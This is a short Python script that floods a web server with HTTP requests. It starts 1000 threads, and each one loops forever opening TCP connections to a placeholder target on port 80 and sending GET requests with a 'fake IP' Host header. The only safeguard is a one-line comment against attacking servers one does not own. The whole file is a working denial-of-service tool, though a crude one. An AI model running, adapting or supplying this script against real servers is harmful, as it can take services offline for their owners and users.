import threading
import socket
# don't attack a server that isn't yours

target = "IP"
port = 80
fake_ip = "fake IP"

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
        	
for i in range(1000):
	t = threading.Thread(target=attack)
	t.start()
